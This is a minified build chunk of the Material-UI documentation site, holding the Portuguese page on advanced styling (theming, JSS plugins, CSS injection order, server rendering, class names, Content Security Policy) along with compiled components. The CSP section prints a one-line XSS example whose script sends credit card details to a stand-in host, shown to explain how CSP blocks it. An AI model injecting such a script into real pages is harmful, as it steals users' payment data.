a.a.cloneElement(f,Object(s.a)({inputComponent:i.a,select:!0,inputProps:Object(s.a)({children:t,classes:o,IconComponent:m,variant:v.variant,type:void 0},g,f?f.props.inputProps:{}),ref:n},y))});f.muiName="Select",n.a=Object(l.default)(p,{name:"MuiNativeSelect"})(f)},kr92:function(e,n){e.exports="import React from 'react';\nimport { jssPreset, StylesProvider, makeStyles } from '@material-ui/styles';\nimport { create } from 'jss';\nimport jssTemplate from 'jss-plugin-template';\n\nconst jss = create({\n  plugins: [jssTemplate(), ...jssPreset().plugins],\n});\n\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n\nfunction Child() {\n  const classes = useStyles();\n  return (\n    <button type=\"button\" className={classes.root}>\n      String templates\n    </button>\n  );\n}\n\nfunction StringTemplates() {\n  return (\n    <StylesProvider jss={jss}>\n      <Child />\n    </StylesProvider>\n  );\n}\n\nexport default StringTemplates;\n"},lPUU:function(e,n,t){var s=t("fGh/"),r=t("hYpR").onFreeze;t("qNvu")("freeze",function(e){return function(n){return e&&s(n)?e(r(n)):n}})},nx5Z:function(e,n,t){"use strict";var s=t("z3IF"),r=t("2Fjn"),o=t("mXGw"),a=t.n(o),i=t("THPt"),l=t.n(i),c=(t("FIWN"),t("PDtE")),d=t("dml9"),u=t("djDG"),m=t("Lv62"),p=t("IZzF"),h=t("Nulz"),f=t("+j9t"),g=t("CH4Z"),y=t("XpU0"),b={standard:d.a,filled:u.a,outlined:m.a},v=a.a.forwardRef(function(e,n){var t=e.autoComplete,o=e.autoFocus,i=e.children,d=e.classes,u=e.className,m=e.defaultValue,y=e.error,v=e.FormHelperTextProps,S=e.fullWidth,j=e.helperText,w=e.hiddenLabel,x=e.id,P=e.InputLabelProps,T=e.inputProps,C=e.InputProps,k=e.inputRef,N=e.label,O=e.multiline,M=e.name,A=e.onBlur,I=e.onChange,D=e.onFocus,E=e.placeholder,R=e.required,B=void 0!==R&&R,F=e.rows,H=e.rowsMax,z=e.select,$=void 0!==z&&z,W=e.SelectProps,L=e.type,J=e.value,q=e.variant,U=void 0===q?"standard":q,G=Object(r.a)(e,["autoComplete","autoFocus","children","classes","className","defaultValue","error","FormHelperTextProps","fullWidth","helperText","hiddenLabel","id","InputLabelProps","inputProps","InputProps","inputRef","label","multiline","name","onBlur","onChange","onFocus","placeholder","required","rows","rowsMax","select","SelectProps","type","value","variant"]),Y=a.a.useState(0),_=Y[0],X=Y[1],V=a.a.useRef(null);a.a.useEffect(function(){if("outlined"===U){var e=l.a.findDOMNode(V.current);X(null!=e?e.offsetWidth:0)}},[U,B]);var K={};"outlined"===U&&(P&&void 0!==P.shrink&&(K.notched=P.shrink),K.labelWidth=_);var Z=j&&x?"".concat(x,"-helper-text"):void 0,Q=b[U],ee=a.a.createElement(Q,Object(s.default)({"aria-describedby":Z,autoComplete:t,autoFocus:o,defaultValue:m,fullWidth:S,multiline:O,name:M,rows:F,rowsMax:H,type:L,value:J,id:x,inputRef:k,onBlur:A,onChange:I,onFocus:D,placeholder:E,inputProps:T},K,C));return a.a.createElement(h.a,Object(s.default)({className:Object(c.a)(d.root,u),error:y,fullWidth:S,hiddenLabel:w,ref:n,required:B,variant:U},G),N&&a.a.createElement(p.a,Object(s.default)({htmlFor:x,ref:V},P),N),$?a.a.createElement(g.a,Object(s.default)({"aria-describedby":Z,value:J,input:ee},W),i):ee,j&&a.a.createElement(f.a,Object(s.default)({id:Z},v),j))});n.a=Object(y.default)({root:{}},{name:"MuiTextField"})(v)},"ny+v":function(e,n,t){"use strict";var s=t("mXGw"),r=t.n(s),o=t("qoly");n.a=Object(o.a)(r.a.createElement("path",{d:"M7 10l5 5 5-5z"}),"ArrowDropDown")},qYY6:function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return l});var s=t("mXGw"),r=t.n(s),o=t("mii5"),a=t("h7Hf");var i=r.a.createElement(function(){var e=Object(o.a)();return r.a.createElement("span",null,"spacing ".concat(e.spacing))},null);function l(){return r.a.createElement(a.a,{theme:{spacing:"8px"}},i)}},qoly:function(e,n,t){"use strict";t.d(n,"a",function(){return i});var s=t("z3IF"),r=t("mXGw"),o=t.n(r),a=t("6dYU");function i(e,n){var t=o.a.memo(o.a.forwardRef(function(n,t){return o.a.createElement(a.a,Object(s.default)({},n,{ref:t}),e)}));return t.muiName=a.a.muiName,t}},t1Wm:function(e,n,t){(window.__NEXT_P=window.__NEXT_P||[]).push(["/styles/advanced",function(){var e=t("2FG1");return{page:e.default||e}}])},"uQs/":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return c});var s=t("mXGw"),r=t.n(s),o=t("PDtE"),a=t("3O2h"),i=Object(a.a)({root:{"&.root":{height:100,width:100,backgroundColor:"blue"},"& .child":{height:8,backgroundColor:"red"}}}),l=r.a.createElement("div",{className:"child"});function c(){var e=i();return r.a.createElement("div",{className:Object(o.a)(e.root,"root")},l)}},vrP6:function(e,n){e.exports="# Avançado\n\n<p class=\"description\">Esta seção aborda o uso mais avançado de @material-ui/styles.</p>\n\n## Temas\n\nAdicione um `ThemeProvider` para o nível superior de sua aplicação para passar o tema pela árvore de componentes do React. Então, você pode acessar o objeto de tema em funções de estilo.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Acessando o tema em um componente\n\nVocê pode precisar acessar as variáveis de tema dentro de seus componentes React.\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Aninhamento de tema\n\nVocê pode aninhar vários provedores de tema. Isso pode ser muito útil ao lidar com diferentes áreas da sua aplicação que têm aparência distinta entre si.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nO tema interno **sobrescreverá** o tema exterior. Você pode estender o tema externo fornecendo uma função:\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Sobrescrevendo estilos - Propriedade `classes`\n\nO `makeStyles` (hook generator) e `withStyles` (HOC) APIs permitem a criação de várias regras de estilos por folha de estilo. Cada regra de estilo tem seu próprio nome de classe. Os nomes das classes são fornecidos para o componente com a variável `classes`. Isso é particularmente útil ao estilizar elementos aninhados em um componente.\n\n```jsx\n// Uma folha de estilo\nconst useStyles = makeStyles({\n  root: {}, // uma regra de estilo\n  label: {}, // uma regra de estilo aninhada\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nNo entanto, os nomes das classes geralmente não são determinísticos. Como um componente pai pode substituir o estilo de um elemento aninhado?\n\n### withStyles\n\nEste é o caso mais simples. O componente encapsulado aceita a propriedade `classes`, ele simplesmente mescla os nomes de classes fornecidos com a folha de estilo.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nA API hook requer um pouco mais de trabalho. Você tem que encaminhar as propriedades do pai para o hook como primeiro argumento.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // uma regra de estilo\n  label: {}, // uma regra de estilo aninhada\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## Plugins JSS\n\nJSS usa plugins para estender sua essência, permitindo que você escolha os recursos que você precisa, e somente pague pela sobrecarga de desempenho para o que você está usando.\n\nNem todos os plugins estão disponíveis por padrão no Material-UI. O seguinte (que é um subconjunto de [jss-preset-default](https://cssinjs.org/jss-preset-default/)) estão incluídos:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nClaro, você é livre para usar plugins adicionais. Aqui está um exemplo com o plugin [jss-rtl](https://github.com/alitaheri/jss-rtl).\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## String templates\n\nSe você preferir a sintaxe CSS sobre o JSS, você pode usar o plugin [jss-plugin-template ](https://cssinjs.org/jss-plugin-template/).\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote que isto não suporta seletores, ou regras aninhadas.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## Ordem de injeção de CSS\n\n> É **muito importante** entender como a especificidade do CSS é calculada pelo navegador. É um dos elementos-chave para saber quando sobrescrever estilos. Nós **recomendamos** que leia este parágrafo do MDN: [Como a especificidade é calculada?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nPor padrão, os estilos são inseridos **por último** no elemento `<head>` da sua página. Eles ganham mais especificidade do que qualquer outra folha de estilo em sua página, por exemplo, módulos CSS, componentes estilizados (styled components).\n\n### injectFirst\n\nO componente `StylesProvider` tem uma propriedade `injectFirst` para injetar as tags de estilo em **primeiro** no cabeçalho (menor prioridade):\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* Sua árvore de componentes.\n      Componentes com estilo podem sobrescrever os estilos de Material-UI. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nA injeção de tags de estilo acontece na **mesma ordem** com as invocações de `makeStyles` / `withStyles` / `styled`. Por exemplo, a cor vermelha ganha maior especificidade neste caso:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Ordem não importa\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Ordem não importa\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 vence.\n  return <div className={className} />;\n}\n```\n\nA ordem de chamada do hook e a ordem de concatenação da classe **não importam**.\n\n### Ponto de inserção (insertionPoint)\n\nJSS [fornece um mecanismo](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) para controlar esta situação. Adicionando um `ponto de inserção` dentro do HTML, você pode [ controlar a ordem](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) que as regras CSS são aplicadas aos seus componentes.\n\n#### Comentário HTML\n\nA abordagem mais simples é adicionar um comentário HTML no `<head>` que determina onde o JSS vai injetar os estilos:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Defina um ponto de inserção customizado que o JSS irá procurar para injetar os estilos no DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### Outro elemento HTML\n\n[Create React App](https://github.com/facebook/create-react-app) remove comentários em HTML ao criar a compilação de produção. Para contornar esse comportamento, você pode fornecer um elemento DOM (diferente de um comentário) como o ponto de inserção do JSS, por exemplo, um elemento `<noscript>`:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Defina um ponto de inserção customizado que o JSS irá procurar para injetar os estilos no DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io impede o acesso ao elemento `<head>`. Para contornar esse comportamento, você pode usar a API JavaScript `documento.createComment()`:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Defina um ponto de inserção customizado que o JSS irá procurar para injetar os estilos no DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## Renderização no servidor (Server-Side Rendering)\n\nEste exemplo retorna uma string de HTML e insere o CSS crítico necessário, logo antes de ser usado:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nVocê pode [seguir o guia lado do servidor](/guides/server-rendering/) para um exemplo mais detalhado, ou leia o [`ServerStyleSheets`](/styles/api/#serverstylesheets) na documentação da API.\n\n### Gatsby\n\nNós temos [um plugin oficial](https://github.com/hupe1980/gatsby-plugin-material-ui) que permite a renderização do lado do servidor para `@material-ui/ styles`. Consulte a página do plugin para obter instruções de configuração e uso.\n\nPara um exemplo de uso atualizado, consulte [este projeto de exemplo](https://github.com/mui-org/material-ui/blob/master/examples/gatsby).\n\n### Next.js\n\nVocê precisa ter um `pages/_document.js` customizado, então copie [esta lógica](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) para injetar os estilos renderizados no lado do servidor no elemento `<head>`.\n\nPara um exemplo de uso atualizado, consulte [este projeto de exemplo](https://github.com/mui-org/material-ui/blob/master/examples/nextjs).\n\n## Nomes de classes (Class names)\n\nOs nomes de classes são gerados pelo [gerador de nome de classe](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Padrão\n\nPor padrão, os nomes de classes gerados por `@material-ui/styles` são **não determinísticos**; você não pode confiar que eles irão permanecer os mesmos. Vejamos a seguinte estilo como um exemplo:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nIsto irá gerar um nome de classe como `makeStyles-root-123`.\n\nVocê tem que usar a propriedade `classes` de um componente para sobrescrever os estilos. A comportamento não determinístico dos nomes de classes permitem o isolamento de estilos.\n\n- Em **desenvolvimento**, o nome da classe é: `.makeStyles-root-123` seguindo esta lógica:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- Em **produção**, o nome da classe é: `.jss123 ` seguindo esta lógica:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### Com `@material-ui/core`\n\nOs nomes de classe gerados dos componentes `@material-ui/core ` se comportam de maneira diferente. Quando as seguintes condições são atendidas, os nomes das classes são **determinísticos**:\n\n- Apenas um provedor de tema é usado (**Sem aninhamento de tema **)\n- A folha de estilo tem um nome que começa com `Mui` (todos os componentes de Material-UI).\n- A opção `disableGlobal` do [gerador de nome de clasee](/styles/api/#creategenerateclassname-options-class-name-generator) é `false` (o padrão).\n\nEssas condições são atendidas com a forma de uso mais comum de `@material-ui/core`. Por exemplo, esta folha de estilo:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngera os seguintes nomes de classe que você pode sobrescrever:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*Esta é uma simplificação da folha de estilo do componente `@material-ui/core/Button`.*\n\nA customização de campos de texto pode ser incômoda com a [API `classes`](#overriding-styles-classes-prop), onde você tem que definir a propriedade classes. É mais fácil usar os valores padrão, conforme descrito acima. Por exemplo:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nO plugin [`jss-plugin-global`](#jss-plugins) é instalado na predefinição padrão. Você pode usá-lo para definir nomes de classes globais.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Híbrido\n\nVocê também pode combinar nomes de classe gerados pelo JSS com nomes globais.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## Prefixos CSS\n\nO JSS usa recursos de detecção para aplicar os prefixos corretos. [Não fique surpreso](https://github.com/mui-org/material-ui/issues/9293) se você não conseguir ver um prefixo específico na versão mais recente do Chrome. Seu navegador provavelmente não precisa disso.\n\n## Política de segurança de conteúdo (CSP)\n\n### O que é CSP e por que é útil?\n\nBasicamente, o CSP reduz os ataques de cross-site scripting (XSS) exigindo que os desenvolvedores incluam na whitelist as fontes de onde seus assets são recuperados. Esta lista é retornada como um cabeçalho do servidor. Por exemplo, digamos que você tenha um site hospedado em `https://example.com` o cabeçalho CSP `default-src: 'self';` permitirá todos os assets localizados em `https://example.com/*` e negar todos os outros. Se houver uma seção do seu site que é vulnerável ao XSS, onde a entrada do usuário de unescaped é exibida, um invasor pode inserir algo como:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nEsta vulnerabilidade permitiria que o invasor executasse qualquer coisa. No entanto, com um cabeçalho CSP seguro, o navegador não carregará esse script.\n\nVocê pode ler mais sobre o CSP no [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### Como se implementa o CSP?\n\nPara usar o CSP com Material-UI (e JSS), você precisa usar um nonce. Um nonce é uma string gerada aleatoriamente que é usada apenas uma vez, portanto, você precisa adicionar um middleware de servidor para gerar um em cada solicitação. JSS tem um [ótimo tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) sobre como conseguir isso com Express and React Helmet. Para um resumo básico, continue lendo.\n\nUm nonce CSP é uma string codificada na Base 64. Você pode gerar um assim:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nÉ muito importante que você use o UUID versão 4, pois ele gera uma string **imprevisível**. Em seguida, você aplica esse nonce ao cabeçalho do CSP. Um cabeçalho CSP pode ser assim com o nonce aplicado:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nSe você estiver usando renderização do lado do servidor(Server-Side Rendering), deverá passar o nonce na tag `<style>` no servidor.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nEntão, você deve passar este nonce para o JSS para que ele possa adicioná-lo às tags `<style>` subsequentes. O lado do cliente obtém o nonce de um cabeçalho. Você deve incluir esse cabeçalho independentemente de o SSR ser usado ou não.\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```"},wuQJ:function(e,n,t){e.exports=t("ZRWS")},"xLO/":function(e,n,t){t("lPUU"),e.exports=t("TaGV").Object.freeze},"xkj/":function(e,n,t){var s={"./GlobalClassName.js":"W1Q1","./GlobalClassName.tsx":"HcJu","./GlobalCss.js":"BCuL","./GlobalCss.tsx":"Jc26","./HybridGlobalCss.js":"aUig","./HybridGlobalCss.tsx":"76xw","./StringTemplates.js":"kr92","./ThemeNesting.js":"I5QN","./ThemeNesting.tsx":"F9ty","./Theming.js":"/+Qa","./Theming.tsx":"ehgw","./UseTheme.js":"RuvM","./UseTheme.tsx":"hDXk","./WithTheme.js":"Rsxw","./WithTheme.tsx":"EhcO"};function r(e){var n=o(e);return t(n)}function o(e){var n=s[e];if(!(n+1)){var t=new Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}return n}r.keys=function(){return Object.keys(s)},r.resolve=o,e.exports=r,r.id="xkj/"}},[["t1Wm","5d41","9da1"]]]);